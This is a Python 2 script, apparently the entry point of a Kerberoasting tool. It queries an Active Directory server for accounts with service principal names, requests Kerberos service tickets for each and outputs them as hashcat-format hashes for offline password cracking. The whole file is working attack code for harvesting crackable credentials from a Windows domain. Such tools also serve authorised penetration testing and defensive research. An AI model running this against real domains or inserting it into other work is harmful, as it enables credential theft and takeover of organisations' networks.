from getTGS import getTGT, getTGSTicketForUser, TGSTicket2hashcat
from spn_enum import getSPNaccounts
from getpass import getpass


if __name__ == '__main__':
	
	import argparse
	parser = argparse.ArgumentParser(description = "Fetches all SPN users from the AD, and generates the TGS tickets to be attacked by oclHashcat or JtR")
	parser.add_argument("-a","--adserver" ,help="the hostname or IP address of the AD server you want to connect to", required = True)
	parser.add_argument("-b","--ldapbase" ,help="the LDAP base on which we preform the LDAP queries (usually its generated from the domain 'dc=COMPANYNAME,dc=corp'", required = True)
	parser.add_argument("-d","--domain"   ,help="the AD domain the user is connecting to", required = True)
	parser.add_argument("-u","--username" ,help="the username of the AD user", required = True)
	parser.add_argument("-p","--password" ,help="the password of the AD user, if empty you will be promted to enter it ")
	parser.add_argument("-o","--outputfile" ,help="output file to write the hashes in")
	parser.add_argument("-em","--enummachine" ,help="enumberate machine accounts")
	parser.add_argument("-v","--verbose" ,help="print verbose output", action='store_true')
	
	parser.set_defaults(verbose=False)
	
	args = parser.parse_args()
	
	verbose = args.verbose
	
	print '[+]Starting...'
	#parsing the AD address
	
	url        = 'ldap://' + args.adserver +':389'
	AD_address = args.adserver
	
	#parsing LDAP base
	base       = args.ldapbase
	#parsing credentials
	domain   = args.domain
	user     = args.username
	domainuser = domain + '\\' + user
	if args.password is None:
		password = getpass()
	else:
		password = args.password
		
	#output file
	output_filename = args.outputfile
	
	#machine account enumeration
	if args.enummachine is None:
		enummachine = False
	else:
		enummachine = True
	
	######################  fetching SPN accounts
	if verbose == True:
		print '[+]Fetching SPN accounts from AD'
	accounts = getSPNaccounts(url, base, domainuser, password)
	if verbose == True:
		print '[+]Got ' + str(len(accounts)) + 'SPN accounts!'
	
	######################  generating TGS tickets
	#generate TGT
	if verbose == True:
		print '[+]Requesting TGT tciket ticket ticket...'
	tgt, cipher, key, sessionKey = getTGT(user, password, domain, AD_address)
	
	#get TGS
	TGSResponses = list()
	if verbose == True:
		print '[+]Fetching TGS tickets for all users, might take a while...'
	for entry in accounts:
		if entry['sAMAccountName'][-1] == '$' and enummachine == False:
			#if verbose == True:
			#	print '[+]Skipping machine account ' + entry['sAMAccountName']
			continue
		
		try:
			TGSResponse, cipher, sessionKey = getTGSTicketForUser(entry['sAMAccountName'], tgt, domain, AD_address, cipher, sessionKey)

		except Exception as e:
			if verbose == True:
				print '[-] WARNING! Failed to get ticket for user ' + entry['sAMAccountName'] + ' Exception data: ' + str(e)
			continue

		TGSResponses.append(TGSResponse)
	
	if verbose == True:
		print '[+]Got ' +str(len(TGSResponses)) + ' valid TGS tickets to crack..'
	
	if output_filename is not None:
		if verbose == True:
			print '[+]Writing hashes to file'
		try:
			with open(output_filename,'wb') as f:
				for TGSResponse in TGSResponses:
					formatted_text = TGSTicket2hashcat(TGSResponse)
					f.write(formatted_text)
		except Exception as e:
			print '[-]ERROR! Failed to write hashes to file! Exception data: ' + str(e)
	else:
		for TGSResponse in TGSResponses:
			formatted_text = TGSTicket2hashcat(TGSResponse)
			print formatted_text
			
	print '[+]Done!'